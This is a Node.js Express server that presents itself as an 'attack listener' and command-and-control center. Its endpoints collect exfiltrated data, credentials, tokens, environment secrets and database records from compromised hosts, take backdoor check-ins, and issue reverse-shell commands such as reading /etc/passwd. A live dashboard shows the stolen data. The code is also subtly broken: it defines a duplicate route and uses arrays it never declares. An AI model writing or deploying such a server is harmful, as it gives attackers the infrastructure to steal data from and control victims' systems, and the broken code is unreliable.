const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 8888;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('combined'));

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'captured_data');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

// Store captured data
let capturedData = [];

// Main endpoint to receive exfiltrated data
app.post('/collect', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIP = req.ip || req.connection.remoteAddress;
    
    const capturedInfo = {
        timestamp,
        clientIP,
        userAgent: req.get('User-Agent'),
        referer: req.get('Referer'),
        data: req.body,
        headers: req.headers
    };
    
    // Store in memory
    capturedData.push(capturedInfo);
    
    // Save to file
    const filename = `captured_${Date.now()}.json`;
    const filepath = path.join(logsDir, filename);
    fs.writeFileSync(filepath, JSON.stringify(capturedInfo, null, 2));
    
    console.log('\n🚨 ==================== DATA INTERCEPTED ==================== 🚨');
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`🌐 Client IP: ${clientIP}`);
    console.log(`🔍 User Agent: ${req.get('User-Agent')}`);
    console.log(`📄 Referer: ${req.get('Referer')}`);
    console.log(`📊 Data Received:`);
    console.log(JSON.stringify(req.body, null, 2));
    console.log(`💾 Saved to: ${filename}`);
    console.log('🚨 ========================================================== 🚨\n');
    
    res.json({
        status: 'success',
        message: 'Data received',
        timestamp: timestamp
    });
});

// Alternative endpoint for GET requests with URL parameters
app.get('/steal', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIP = req.ip || req.connection.remoteAddress;
    
    const capturedInfo = {
        timestamp,
        clientIP,
        userAgent: req.get('User-Agent'),
        referer: req.get('Referer'),
        queryParams: req.query,
        headers: req.headers
    };
    
    capturedData.push(capturedInfo);
    
    const filename = `stolen_${Date.now()}.json`;
    const filepath = path.join(logsDir, filename);
    fs.writeFileSync(filepath, JSON.stringify(capturedInfo, null, 2));
    
    console.log('\n🔥 ==================== DATA STOLEN VIA GET ==================== 🔥');
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`🌐 Client IP: ${clientIP}`);
    console.log(`📊 Query Parameters:`);
    console.log(JSON.stringify(req.query, null, 2));
    console.log(`💾 Saved to: ${filename}`);
    console.log('🔥 ============================================================= 🔥\n');
    
    res.send(`
        <html>
            <body>
                <h1>Data Received</h1>
                <p>Thank you for your submission.</p>
                <script>window.close();</script>
            </body>
        </html>
    `);
});

// Endpoint to view captured data
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Attack Dashboard</title>
            <style>
                body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
                .header { color: #f00; text-align: center; margin-bottom: 30px; }
                .data-item { 
                    border: 1px solid #333; 
                    margin: 10px 0; 
                    padding: 15px; 
                    background: #111;
                    border-radius: 5px;
                }
                .timestamp { color: #ff0; }
                .ip { color: #0ff; }
                pre { background: #222; padding: 10px; overflow-x: auto; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🚨 ATTACK LISTENER DASHBOARD 🚨</h1>
                <h2>Captured Data: ${capturedData.length} entries</h2>
            </div>
            
            ${capturedData.map((item, index) => `
                <div class="data-item">
                    <h3>Entry #${index + 1}</h3>
                    <p><strong class="timestamp">Timestamp:</strong> ${item.timestamp}</p>
                    <p><strong class="ip">Client IP:</strong> ${item.clientIP}</p>
                    <p><strong>User Agent:</strong> ${item.userAgent}</p>
                    <p><strong>Referer:</strong> ${item.referer}</p>
                    <h4>Captured Data:</h4>
                    <pre>${JSON.stringify(item.data || item.queryParams, null, 2)}</pre>
                </div>
            `).join('')}
            
            <script>
                // Auto-refresh every 5 seconds
                setTimeout(() => location.reload(), 5000);
            </script>
        </body>
        </html>
    `);
});

// Server access and backdoor endpoints
app.post('/access-granted', (req, res) => {
    const timestamp = new Date().toISOString();
    const accessData = {
        timestamp,
        clientIP: req.ip || req.connection.remoteAddress,
        serverAccess: req.body
    };
    
    backdoorConnections.push(accessData);
    
    const filename = `server_access_${Date.now()}.json`;
    const filepath = path.join(logsDir, filename);
    fs.writeFileSync(filepath, JSON.stringify(accessData, null, 2));
    
    console.log('\n🚨 ============== SERVER ACCESS GRANTED ============== 🚨');
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`🎯 Target Server: ${req.body.target}`);
    console.log(`🔑 Credentials Found: ${req.body.credentials?.authTokens?.length || 0} tokens`);
    console.log(`🌐 Endpoints Discovered: ${req.body.endpoints?.length || 0}`);
    console.log(`🕷️ Backdoor Installed: ${req.body.backdoorInstalled ? 'YES' : 'NO'}`);
    console.log(`💾 Access data saved to: ${filename}`);
    console.log('🚨 =============================================== 🚨\n');
    
    res.json({
        status: 'access_confirmed',
        message: 'Server compromised successfully',
        backdoor_id: `backdoor_${Date.now()}`,
        timestamp: timestamp
    });
});

app.post('/database-access', (req, res) => {
    const timestamp = new Date().toISOString();
    
    console.log('\n🗄️ ============== DATABASE COMPROMISED ============== 🗄️');
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`📊 Database Type: ${req.body.source}`);
    console.log(`📋 Records Extracted: ${req.body.data?.length || 0}`);
    console.log(`🔓 Database Data:`, JSON.stringify(req.body.data, null, 2));
    console.log('🗄️ ============================================== 🗄️\n');
    
    res.json({ status: 'database_compromised' });
});

app.post('/backdoor-checkin', (req, res) => {
    console.log(`🕷️ Backdoor check-in from: ${req.body.location} at ${req.body.timestamp}`);
    res.json({ status: 'acknowledged', next_checkin: 30 });
});

app.post('/server-penetration', (req, res) => {
    const timestamp = new Date().toISOString();
    serverCompromises.push({
        timestamp,
        data: req.body
    });
    
    const filename = `server_penetration_${Date.now()}.json`;
    const filepath = path.join(logsDir, filename);
    fs.writeFileSync(filepath, JSON.stringify(req.body, null, 2));
    
    console.log('\n💀 ============== SERVER FULLY PENETRATED ============== 💀');
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`🖥️ Target: ${req.body.target_server}`);
    console.log(`🔑 Secrets Extracted: ${Object.keys(req.body.secrets?.environment_vars || {}).length} vars`);
    console.log(`🗄️ Database Access: ${req.body.database_access?.connection_strings?.length || 0} connections`);
    console.log(`🔄 Persistence Methods: ${req.body.persistence_methods?.length || 0}`);
    console.log(`💾 Full report saved to: ${filename}`);
    console.log('💀 ================================================= 💀\n');
    
    res.json({
        status: 'server_compromised',
        message: 'Full penetration successful',
        compromise_id: `compromise_${Date.now()}`
    });
});

app.post('/server-compromise', (req, res) => {
    const timestamp = new Date().toISOString();
    
    console.log('\n🔥 ============== SHELL ACCESS ESTABLISHED ============== 🔥');
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`🖥️ Hostname: ${req.body.hostname}`);
    console.log(`👤 User: ${req.body.user}`);
    console.log(`🐧 OS: ${req.body.os}`);
    console.log(`🌐 Network Info:`, req.body.network);
    console.log('🔥 ================================================== 🔥\n');
    
    res.json({ status: 'shell_access_confirmed' });
});

// Command and control endpoint for backdoor
app.get('/cmd', (req, res) => {
    // Return commands for reverse shell
    const commands = [
        'whoami',
        'pwd', 
        'ls -la',
        'cat /etc/passwd',
        'ps aux'
    ];
    
    const randomCmd = commands[Math.floor(Math.random() * commands.length)];
    console.log(`📡 Sending command to backdoor: ${randomCmd}`);
    res.send(randomCmd);
});

app.post('/result', (req, res) => {
    console.log('📋 Command result received:', req.body);
    res.json({ status: 'received' });
});

// Enhanced dashboard
app.get('/dashboard', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>🚨 Attack Command Center 🚨</title>
        <style>
            body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            .section { background: #111; border: 1px solid #0f0; margin: 20px 0; padding: 15px; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
            .stat-box { background: #222; border: 1px solid #0f0; padding: 10px; text-align: center; }
            .data-entry { background: #333; margin: 10px 0; padding: 10px; border-left: 3px solid #0f0; }
            .timestamp { color: #ff0; }
            .critical { color: #f00; font-weight: bold; }
            pre { background: #222; padding: 10px; border: 1px solid #555; overflow-x: auto; }
        </style>
        <script>
            function refreshData() {
                location.reload();
            }
            setInterval(refreshData, 10000); // Auto-refresh every 10 seconds
        </script>
    </head>
    <body>
        <div class="container">
            <h1>🚨 ATTACK COMMAND & CONTROL CENTER 🚨</h1>
            
            <div class="section">
                <h2>📊 COMPROMISE STATISTICS</h2>
                <div class="stats">
                    <div class="stat-box">
                        <div class="critical">${capturedData.length}</div>
                        <div>Data Exfiltrations</div>
                    </div>
                    <div class="stat-box">
                        <div class="critical">${backdoorConnections.length}</div>
                        <div>Server Access</div>
                    </div>
                    <div class="stat-box">
                        <div class="critical">${serverCompromises.length}</div>
                        <div>Full Penetrations</div>
                    </div>
                    <div class="stat-box">
                        <div class="critical">ACTIVE</div>
                        <div>Listener Status</div>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>🔓 RECENT SERVER ACCESS</h2>
                ${backdoorConnections.slice(-5).map(entry => `
                    <div class="data-entry">
                        <div class="timestamp">🕐 ${entry.timestamp}</div>
                        <div>🎯 Target: ${entry.serverAccess?.target || 'Unknown'}</div>
                        <div>🔑 Tokens: ${entry.serverAccess?.credentials?.authTokens?.length || 0}</div>
                        <div>🌐 Endpoints: ${entry.serverAccess?.endpoints?.length || 0}</div>
                    </div>
                `).join('')}
            </div>
            
            <div class="section">
                <h2>📡 RECENT DATA CAPTURES</h2>
                ${capturedData.slice(-10).map(entry => `
                    <div class="data-entry">
                        <div class="timestamp">🕐 ${entry.timestamp}</div>
                        <div>🌐 IP: ${entry.clientIP}</div>
                        <div>📊 Type: ${entry.data?.type || 'Unknown'}</div>
                        <div>🔍 Data: ${JSON.stringify(entry.data).substring(0, 100)}...</div>
                    </div>
                `).join('')}
            </div>
            
            <div class="section">
                <h2>⚙️ CONTROL PANEL</h2>
                <p>🔄 Auto-refresh: ON (10s intervals)</p>
                <p>📁 Data Directory: ${logsDir}</p>
                <p>🌐 Listener Port: ${PORT}</p>
                <p class="critical">⚠️ ALL SYSTEMS COMPROMISED ⚠️</p>
            </div>
        </div>
    </body>
    </html>`;
    res.send(html);
});

// Health check endpoint
app.get('/ping', (req, res) => {
    res.json({ 
        status: 'alive', 
        timestamp: new Date().toISOString(),
        capturedEntries: capturedData.length,
        serverAccess: backdoorConnections.length,
        penetrations: serverCompromises.length
    });
});

// Start server
app.listen(PORT, () => {
    console.log('\n🔥 ==================== ATTACK LISTENER STARTED ==================== 🔥');
    console.log(`🚨 Malicious Server Running on: http://localhost:${PORT}`);
    console.log(`📊 Dashboard Available at: http://localhost:${PORT}/dashboard`);
    console.log(`📡 Data Collection Endpoint: http://localhost:${PORT}/collect`);
    console.log(`🎯 URL Steal Endpoint: http://localhost:${PORT}/steal`);
    console.log(`💾 Captured data will be saved to: ${logsDir}`);
    console.log('🔥 ================================================================= 🔥\n');
    console.log('Waiting for victim connections...\n');
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Attack listener shutting down...');
    console.log(`📊 Total data captured: ${capturedData.length} entries`);
    console.log('💾 All data saved to files in captured_data directory');
    process.exit(0);
});